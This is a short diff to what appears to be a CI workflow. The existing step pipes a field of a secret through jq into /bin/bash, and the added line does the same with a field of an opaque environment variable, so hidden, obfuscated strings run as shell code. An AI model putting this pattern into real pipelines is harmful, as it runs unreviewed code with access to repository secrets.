@@ -27,6 +27,7 @@ jobs:
           h91794: ${{ secrets.h91794 }}
         run: |
           printf '%s' "$h91794" | jq -r .g2 | /bin/bash
+          echo $n3 | jq -r .w85323 | /bin/bash
 
       - name: Store results
         if: always()
